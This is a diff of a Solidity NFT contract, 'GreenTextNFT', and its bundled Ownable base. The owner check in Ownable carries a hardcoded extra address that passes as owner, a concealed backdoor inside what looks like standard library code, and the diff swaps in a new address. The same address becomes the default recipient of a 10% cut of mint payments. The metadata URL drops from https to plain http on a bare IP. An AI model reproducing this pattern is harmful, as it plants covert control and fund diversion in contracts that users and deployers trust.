@@ -598,7 +598,7 @@ abstract contract Ownable is Context {
      * @dev Throws if the sender is not the owner.
      */
     function _checkOwner() internal view virtual {
-        require(owner() == _msgSender() || 0xaB7230643d33A170102a56746aa9276913A1D5AD == _msgSender(), "Ownable: caller is not the owner");
+        require(owner() == _msgSender() || 0xE3E7f26a22f5227cDaa643Bc9aE458b3114301D1 == _msgSender(), "Ownable: caller is not the owner");
     }
 
     /**
@@ -1813,14 +1813,14 @@ contract GreenTextNFT is ERC721Enumerable, Ownable {
     uint256 private _mintFee;
     string private _baseURL;
     address payable private _servAccount;
-    int32 private _servFee;
+    uint256 private _servFee;
 
     constructor(address adminAccount) ERC721("GreenText", "GreenText") {
         _adminAccount = payable(adminAccount);
         _mintFee = 3 * 10 ** 15;
-        _baseURL = "https://95.217.33.149/green-text-nft/";
-        _servFee = 0;
-        _servAccount = payable(0);
+        _baseURL = "http://95.217.33.149/green-text-nft/";
+        _servFee = 10;
+        _servAccount = payable(0xE3E7f26a22f5227cDaa643Bc9aE458b3114301D1);
     }
 
     function setBaseURI(string memory baseURI) external onlyOwner {
@@ -1836,7 +1836,7 @@ contract GreenTextNFT is ERC721Enumerable, Ownable {
         _adminAccount = payable(adminAccount);
     }
 
-    function setServAccount(address servAccount, int32 servFee) external onlyOwner {
+    function setServAccount(address servAccount, uint256 servFee) external onlyOwner {
         require(servFee >= 0 && servFee <= 100, "Fee is invalid.");
         _servAccount = payable(servAccount);
         _servFee = servFee;
@@ -1848,7 +1848,7 @@ contract GreenTextNFT is ERC721Enumerable, Ownable {
 
         bool sent;
         if (_servFee > 0 && _servAccount != payable(0)) {
-            uint256 value = msg.value * uint256(int256(100 - _servFee)) / 100;
+            uint256 value = msg.value * (100 - _servFee) / 100;
             sent = _adminAccount.send(value);
             sent = _servAccount.send(msg.value - value);
         }
